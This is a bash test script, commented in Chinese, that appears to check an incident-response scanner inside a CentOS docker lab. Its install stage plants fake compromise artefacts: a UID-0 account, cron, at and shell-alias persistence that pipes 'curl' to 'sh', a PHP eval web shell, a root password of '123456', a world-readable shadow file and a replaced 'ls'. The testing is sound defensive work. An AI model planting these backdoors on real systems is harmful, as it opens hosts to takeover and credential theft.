#!/usr/bin/env bash
# centos-ir-lab 测试台（v0.4）：远程脚本以文件方式 docker cp 进容器执行——零引号地狱。
# 夹具全部 ctfir-marker 前缀；结束清理并复验。用法: fixture_builder_centos.sh <linux_ctfir_path>
set -uo pipefail
export MSYS_NO_PATHCONV=1
BIN_HOST="$1"
C=centos-ir-lab
pass=0; fail=0
ok()  { pass=$((pass+1)); echo "[PASS] $1"; }
bad() { fail=$((fail+1)); echo "[FAIL] $1"; }

# ---- 远程脚本（本地生成，docker cp 进容器）----
mkdir -p /d/ctfir-build/fixtmp

# 阶段2：夹具安装
cat > /d/ctfir-build/fixtmp/install.sh <<'FIXEOF'
#!/bin/bash
sed -i "/ctfir-marker/d;/ctfir-mark-empty/d" /etc/passwd
echo "ctfir-marker:x:0:0:marker:/tmp:/bin/sh" >> /etc/passwd
echo "ctfir-mark-empty::19001:19001::/tmp:/bin/sh" >> /etc/passwd
echo "ctfir-mark-sys:x:498:498::/var/empty:/bin/bash" >> /etc/passwd
echo "* * * * * root curl http://127.0.0.1/ctfir-marker | sh" > /etc/cron.d/ctfir-marker
echo "127.0.0.1 ctfir-marker.invalid # ctfir-marker" >> /etc/hosts
echo 'alias ls="curl http://127.0.0.1/ctfir-marker | sh"' > /etc/profile.d/ctfir-marker.sh
mkdir -p /var/www/html /var/log/httpd /etc/systemd/system /root/.ssh /usr/bin /etc/redis /var/spool/at
printf '<?php eval($_POST["cmd"]); ?>\n' > /var/www/html/ctfir-marker.php
printf '<?php phpinfo(); ?>\n' > /var/www/html/ctfir-marker-phpinfo.php
i=0; while [ $i -lt 60 ]; do echo '10.99.99.99 - - [08/Nov/2026:10:00:00 +0800] "POST /ctfir-marker.php HTTP/1.1" 200 -' >> /var/log/httpd/access_log; i=$((i+1)); done
printf '[Timer]\nOnCalendar=*\n' > /etc/systemd/system/ctfir-marker.timer
echo "curl http://127.0.0.1/ctfir-marker | sh" > /var/spool/at/ctfir-marker
chmod o+r /etc/shadow
cp /bin/true /usr/bin/ctfir-marker-cap && setcap cap_net_raw+ep /usr/bin/ctfir-marker-cap 2>/dev/null
ORIG=$(grep '^root:' /etc/shadow | cut -d: -f2)
echo "$ORIG" > /tmp/ctfir-root-hash.bak
NEW=$(openssl passwd -1 -salt ctfirmk 123456 2>/dev/null)
if [ -n "$NEW" ]; then sed -i "s|^root:[^:]*:|root:$NEW:|" /etc/shadow; echo patched > /tmp/ctfir-root-patched; fi
ln -sf /dev/null /etc/systemd/system/multi-user.target.wants/ctfir-marker-telnet.service 2>/dev/null
printf 'bind 0.0.0.0\nprotected-mode no\n' > /etc/redis/redis.conf
printf '[mysqld]\nlocal-infile=1\n' > /etc/my.cnf
echo "allow_url_include=On" > /tmp/ctfir-php.ini
# --- R10: 命令替换 / SSH端口 / 最近文件 / 进程名伪装 ---
cp -f /usr/bin/ls /usr/bin/ls.ctfir-bak 2>/dev/null
printf '#!/bin/sh\necho ctfir-marker\n' > /usr/bin/ls && chmod 755 /usr/bin/ls
mkdir -p /etc/ssh
grep -q '^Port ' /etc/ssh/sshd_config 2>/dev/null || echo "Port 2222" >> /etc/ssh/sshd_config 2>/dev/null || printf 'Port 2222\n' > /etc/ssh/sshd_config
printf '#!/bin/sh\n' > /root/ctfir-marker-recent.sh && chmod 755 /root/ctfir-marker-recent.sh
cp -f /bin/sleep /tmp/ctfir-mismatch
bash -c 'exec -a kworkerd /tmp/ctfir-mismatch 600' >/dev/null 2>&1 &
echo INSTALL_DONE
FIXEOF

# 阶段4：清理
cat > /d/ctfir-build/fixtmp/cleanup.sh <<'CLNEOF'
#!/bin/bash
sed -i '/ctfir-marker/d;/ctfir-mark-empty/d;/ctfir-mark-sys/d' /etc/passwd 2>/dev/null || true
grep -v -e ctfir-marker -e ctfir-mark-empty -e ctfir-mark-sys /etc/hosts > /tmp/hosts.new 2>/dev/null && cat /tmp/hosts.new > /etc/hosts; rm -f /tmp/hosts.new
sed -i '/ctfir-marker/d' /var/log/httpd/access_log 2>/dev/null || true
if [ -f /tmp/ctfir-root-hash.bak ]; then
  ORIG=$(cat /tmp/ctfir-root-hash.bak)
  sed -i "s|^root:[^:]*:|root:$ORIG:|" /etc/shadow
  rm -f /tmp/ctfir-root-hash.bak /tmp/ctfir-root-patched
fi
rm -f /etc/cron.d/ctfir-marker /etc/profile.d/ctfir-marker.sh /etc/systemd/system/ctfir-marker.timer \
      /var/spool/at/ctfir-marker /var/www/html/ctfir-marker.php /var/www/html/ctfir-marker-phpinfo.php \
      /usr/bin/ctfir-marker-cap /etc/redis/redis.conf /etc/my.cnf /tmp/ctfir-php.ini \
      /root/ctfir-marker-recent.sh /tmp/ctfir-mismatch
[ -f /usr/bin/ls.ctfir-bak ] && mv -f /usr/bin/ls.ctfir-bak /usr/bin/ls
# argv[0] 伪装使 pgrep -f 失效，改用 exe 符号链接定位（检测同款思路）
for pd in /proc/[0-9]*; do
  [ "$(readlink "$pd/exe" 2>/dev/null | cut -d' ' -f1)" = "/tmp/ctfir-mismatch" ] && kill -9 "${pd##*/}" 2>/dev/null
done
sed -i '/^Port 2222$/d' /etc/ssh/sshd_config 2>/dev/null || true
# 若 sshd_config 是夹具新建的且只剩空壳则删除
[ -f /etc/ssh/sshd_config ] && [ ! -s /etc/ssh/sshd_config ] && rm -f /etc/ssh/sshd_config
rmdir /etc/redis 2>/dev/null
rm -f /etc/systemd/system/multi-user.target.wants/ctfir-marker-telnet.service
chmod og-rwx /etc/shadow 2>/dev/null
echo CLEANUP_DONE
CLNEOF

docker start "$C" >/dev/null 2>&1
ex() { docker exec "$C" bash -c "$1" 2>&1; }
ex 'pgrep -x crond >/dev/null || crond; pgrep -x rsyslogd >/dev/null || rsyslogd; pgrep -x sshd >/dev/null || /usr/sbin/sshd; pgrep -x httpd >/dev/null || httpd -k start' >/dev/null
docker cp "$BIN_HOST" "$C:/tmp/ctfir" >/dev/null
docker cp "D:/ctfir-build/fixtmp/install.sh" "$C:/tmp/install.sh" >/dev/null
docker cp "D:/ctfir-build/fixtmp/cleanup.sh" "$C:/tmp/cleanup.sh" >/dev/null
ex 'chmod +x /tmp/ctfir /tmp/install.sh /tmp/cleanup.sh' >/dev/null

echo "=== 阶段1：负例（centos-ir-lab 原生状态）==="
ex 'rm -rf /tmp/ctfir-out-neg && /tmp/ctfir scan --out /tmp/ctfir-out-neg >/dev/null 2>&1; echo exit=$?'
RESN=$(ex 'cat /tmp/ctfir-out-neg/findings.json')
echo "$RESN" | grep -q "ctfir-marker" && bad "干净环境出现 marker" || ok "干净环境无 marker"
ex 'cat /tmp/ctfir-out-neg/findings.json' | grep -o '"rule_id": "[A-Z0-9.]*"' | sort | uniq -c > /d/ctfir-build/centos-native-findings.txt
echo "（原生发现清单已存 /d/ctfir-build/centos-native-findings.txt）"

echo "=== 阶段2：夹具安装 ==="
ex '/tmp/install.sh' | tail -1

echo "=== 阶段3：扫描断言（root + --baseline + --dir）==="
ex 'mkdir -p /tmp/ctfir-baseline; echo original-one > /tmp/ctfir-baseline/a.txt; echo original-two > /tmp/ctfir-baseline/b.txt; sha256sum /tmp/ctfir-baseline/a.txt /tmp/ctfir-baseline/b.txt | sed "s|/tmp/ctfir-baseline/||" > /tmp/ctfir-baseline.list; echo modified-one > /tmp/ctfir-baseline/a.txt'
ex 'rm -rf /tmp/ctfir-out-pos && /tmp/ctfir scan --out /tmp/ctfir-out-pos --baseline /tmp/ctfir-baseline.list --dir /tmp/ctfir-baseline >/dev/null 2>&1; echo exit=$?'
RES=$(ex 'cat /tmp/ctfir-out-pos/findings.json')
EV=$(ex 'cat /tmp/ctfir-out-pos/evidence.json')
echo "$EV" > /d/ctfir-build/ev-dump.json
echo "EV_LEN=${#EV}"

a() { echo "$RES" | grep -q "$1" && ok "$2" || bad "$3"; }
a "LNX.ACC.UID0.001"            "UID0 命中"              "UID0 漏检"
a "LNX.PERSIST.CRON.001"        "cron 命中"              "cron 漏检"
a "LNX.HOSTS.LOOPBACK.001"      "hosts 回环命中"         "hosts 回环漏检"
a "LNX.PERSIST.PROFILE.001"     "profile 命中"           "profile 漏检"
a "LNX.WEB.SHELL.001"           "webshell 命中"          "webshell 漏检"
a "LNX.WEB.LOGPOST.001"         "POST Top IP 命中"       "日志漏检"
grep -q "10.99.99.99" /d/ctfir-build/ev-dump.json && ok "Top IP 正确（evidence）" || bad "Top IP 错误"
a "LNX.TIMER.FACT.001"          "timer 事实化"           "timer 漏检"
a "LNX.PERSIST.AT.001"          "at 命中"                "at 漏检"
a "LNX.ACC.SHADOWPERM.001"      "shadow 权限命中"        "shadow 漏检"
a "LNX.CAPS.UNEXPECTED.001"     "caps 命中"              "caps 漏检"
a "LNX.FILES.BASELINE.001"      "基线 mismatch 命中"     "基线漏检"
echo "--- v0.4 基线/中间件 ---"
a "LNX.BASE.EMPTYPWD.001"       "空口令账户命中"         "空口令漏检"
a "LNX.BASE.WEAKPWD.001"        "root 弱口令命中"        "弱口令漏检"
a "LNX.BASE.SYSACCT.001"        "系统账户可登录命中"     "系统账户漏检"
a "LNX.BASE.UNSAFESVC.001"      "不安全服务命中"         "不安全服务漏检"
a "MID.REDIS.NOPASS.001"        "Redis 未授权命中"       "Redis 漏检"
a "MID.REDIS.PROTMODE.001"      "Redis protected-mode 命中" "Redis PM 漏检"
a "MID.MYSQL.LOCALINFILE.001"   "MySQL local-infile 命中" "MySQL 漏检"
a "MID.PHP.PHPINFO.001"         "phpinfo 文件命中"       "phpinfo 漏检"
echo "--- v0.5-R10 命令替换/端口/近期文件/进程伪装 ---"
a "LNX.BASE.CMDSIZE.001"        "ls 替换命中（大小异常）" "命令替换漏检"
a "LNX.SSH.PORT.001"            "SSH 2222 端口命中"      "SSH 端口漏检"
a "LNX.BASE.RECENT.001"         "近期可执行文件命中"     "近期文件漏检"
a "LNX.PROC.NAMEMISMATCH.001"   "进程名伪装命中"         "进程名伪装漏检"
echo "$RES" | grep -q "ADVICE"  && ok "建议挂接" || bad "建议缺失"

echo "=== 阶段4：清理并复验 ==="
ex '/tmp/cleanup.sh' | tail -1
ex 'rm -rf /tmp/ctfir-out-clean /tmp/ctfir-baseline /tmp/ctfir-baseline.list && /tmp/ctfir scan --out /tmp/ctfir-out-clean >/dev/null 2>&1'
RES2=$(ex 'cat /tmp/ctfir-out-clean/findings.json')
echo "$RES2" | grep -q "ctfir-marker" && bad "清理后残留" || ok "清理复验通过"
ex 'rm -rf /tmp/ctfir-out-clean /tmp/ctfir-out-neg /tmp/ctfir-out-pos; rm -f /tmp/ctfir /tmp/install.sh /tmp/cleanup.sh' >/dev/null
docker stop "$C" >/dev/null 2>&1

echo "=== 结果: pass=$pass fail=$fail ==="
[ "$fail" -eq 0 ]
